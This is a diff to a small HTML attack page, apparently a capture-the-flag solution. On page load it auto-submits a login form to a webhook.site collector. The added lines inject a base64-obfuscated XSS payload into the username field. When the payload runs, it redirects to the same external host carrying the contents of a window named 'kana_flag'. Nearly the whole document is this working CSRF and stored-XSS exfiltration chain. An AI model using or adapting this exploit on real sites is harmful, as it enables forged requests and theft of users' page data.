@@ -4,12 +4,15 @@
 </head>
 <body>
 <form method="POST" action="https://webhook.site/8fe6e4f2-cfe9-46f4-9013-a616cfbf4e35">
-  <input id="username" class="mgb-1" name="username" value="bla"/>
+  <input id="username" class="mgb-1" name="username" value=""/>
   <input id="secret" class="mgb-1" name="secret" value="bbbbaaaa"/>
   <button class="mgb-1" id="clickbtn" type="submit">Login</button>
 </form>
 <script>
-window.addEventListener('load', function(){document.getElementById("clickbtn").form.submit();});
+window.addEventListener('load', function(){
+document.getElementById("username").value = atob("YmxhYmxhIDxzY3JpcHQ+CndpbmRvdy5hZGRFdmVudExpc3RlbmVyKCdsb2FkJywgZnVuY3Rpb24oKXt3aW5kb3cubG9jYXRpb24gPSAnaHR0cHM6Ly93ZWJob29rLnNpdGUvOGZlNmU0ZjItY2ZlOS00NmY0LTkwMTMtYTYxNmNmYmY0ZTM1Lz9mbGFnPScgKyB3aW5kb3cub3BlbignJywgJ2thbmFfZmxhZycpLmRvY3VtZW50LmJvZHkuaW5uZXJUZXh0fSk7Cjwvc2NyaXB0Pg==");
+document.getElementById("clickbtn").form.submit();
+});
 </script>
 </body>
 </html>
